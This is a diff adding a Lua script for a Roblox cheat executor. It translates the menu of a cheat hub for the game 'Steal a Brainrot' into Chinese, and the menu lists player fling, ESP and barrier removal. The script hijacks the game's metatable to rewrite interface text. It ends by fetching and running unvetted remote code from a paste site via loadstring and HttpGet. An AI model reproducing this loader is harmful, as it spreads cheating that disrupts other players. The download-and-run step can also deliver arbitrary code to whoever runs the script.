@@ -1,0 +1,146 @@
+-- 翻译表：按照 ["英文文本"] = "中文文本" 的格式维护
+local Translations = {
+    ["Config"] = "配置",
+    ["Console"] = "控制台",
+    ["Home"] = "主页",
+    ["Movement"] = "移动",
+    ["Server"] = "服务器",
+    ["Visual"] = "视觉",
+    ["Configuration System"] = "配置系统",
+    ["Save and load your settings. Works when you rejoin!"] = "保存和加载您的设置。重新加入时生效！",
+    ["Save Settings"] = "保存设置",
+    ["Load Settings"] = "加载设置",
+    ["Console & Debug"] = "控制台与调试",
+    ["Console Output"] = "控制台输出",
+    ["Clear"] = "清除",
+    ["Welcome"] = "欢迎",
+    ["Welcome to ZZZZZ HUB v1.7"] = "欢迎使用 ZZZZZ HUB v1.7",
+    ["Best Free Steal a Brainrot Script."] = "最佳免费 Brainrot 脚本。",
+    ["always updating each week! We are ZZZZZ HUB!"] = "每周持续更新！我们是 ZZZZZ HUB！",
+    ["Join our community: https://discord.gg/zzzzhub"] = "加入我们的社区：https://discord.gg/zzzzhub",
+    ["Player Movement"] = "玩家移动",
+    ["Bat Destroyer (600x)"] = "蝙蝠破坏者（600 倍）",
+    ["Float"] = "漂浮",
+    ["Height Bypass"] = "高度绕过",
+    ["Tall like zzzz"] = "像 zzzz 一样高",
+    ["Float to Plot"] = "漂浮到地块",
+    ["Select Player for Fling"] = "选择要抛掷的玩家",
+    ["Ragdoll Desync"] = "布娃娃不同步",
+    ["Laser Cape Auto-Fire"] = "激光斗篷自动开火",
+    ["Freeze"] = "冻结",
+    ["Grapple Flight"] = "抓钩飞行",
+    ["Infinite Jump"] = "无限跳跃",
+    ["Platform"] = "平台",
+    ["Helicopter"] = "直升机",
+    ["Fling System"] = "抛掷系统",
+    ["Fling Em"] = "抛掷他们",
+    ["Server Options"] = "服务器选项",
+    ["Server Hop"] = "服务器跳转",
+    ["Private Server"] = "私人服务器",
+    ["Rejoin Server"] = "重新加入服务器",
+    ["ESP Controls"] = "ESP 控制",
+    ["Player ESP"] = "玩家 ESP",
+    ["Plot ESP"] = "地块 ESP",
+    ["Brainrot ESP"] = "Brainrot ESP",
+    ["Timer ESP"] = "计时器 ESP",
+    ["Delete Borders"] = "删除边界",
+    ["Barrier Increase"] = "屏障增强",
+    ["Time"] = "时间"
+    -- 若后续有新文本，在此继续添加即可
+}
+
+-- 文本翻译函数：优先精准匹配，再尝试模糊替换
+local function translateText(text)
+    if not text or type(text) ~= "string" then return text end
+    return Translations[text] or (function()
+        for en, cn in pairs(Translations) do
+            if text:find(en) then
+                return text:gsub(en, cn)
+            end
+        end
+        return text
+    end)()
+end
+
+-- 初始化翻译引擎：元表劫持 + 兜底扫描
+local function setupTranslationEngine()
+    local success, err = pcall(function()
+        local mt = getrawmetatable(game)
+        local oldNewIndex = mt.__newindex
+        setreadonly(mt, false)
+        
+        mt.__newindex = newcclosure(function(t, k, v)
+            if (t:IsA("TextLabel") or t:IsA("TextButton") or t:IsA("TextBox")) and k == "Text" then
+                v = translateText(tostring(v))
+            end
+            return oldNewIndex(t, k, v)
+        end)
+        
+        setreadonly(mt, true)
+    end)
+    
+    if not success then
+        warn("元表劫持失败，启用兜底扫描：", err)
+        local translated = {}
+        local function scanGui(parent)
+            for _, gui in ipairs(parent:GetDescendants()) do
+                if (gui:IsA("TextLabel") or gui:IsA("TextButton") or gui:IsA("TextBox")) and not translated[gui] then
+                    pcall(function()
+                        local text = gui.Text
+                        if text and text ~= "" then
+                            local translatedText = translateText(text)
+                            if translatedText ~= text then
+                                gui.Text = translatedText
+                                translated[gui] = true
+                            end
+                        end
+                    end)
+                end
+            end
+        end
+        
+        local function listenDescendant(parent)
+            parent.DescendantAdded:Connect(function(descendant)
+                if (descendant:IsA("TextLabel") or descendant:IsA("TextButton") or descendant:IsA("TextBox")) then
+                    task.wait(0.1)
+                    pcall(function()
+                        local text = descendant.Text
+                        if text and text ~= "" then
+                            local translatedText = translateText(text)
+                            if translatedText ~= text then
+                                descendant.Text = translatedText
+                            end
+                        end
+                    end)
+                end
+            end)
+        end
+        
+        scanGui(game:GetService("CoreGui"))
+        local playerGui = game:GetService("Players").LocalPlayer:FindFirstChild("PlayerGui")
+        if playerGui then scanGui(playerGui) end
+        
+        listenDescendant(game:GetService("CoreGui"))
+        if playerGui then listenDescendant(playerGui) end
+        
+        -- 周期性扫描确保无遗漏
+        while true do
+            scanGui(game:GetService("CoreGui"))
+            if playerGui then scanGui(playerGui) end
+            task.wait(3)
+        end
+    end
+end
+
+-- 等待界面加载后初始化翻译
+task.wait(2)
+setupTranslationEngine()
+
+-- 加载外部脚本（请确保链接可靠）
+local success, err = pcall(function()
+    loadstring(game:HttpGet("https://pastefy.app/DHyT4Zoi/raw"))()
+end)
+
+if not success then
+    warn("外部脚本加载失败：", err)
+end
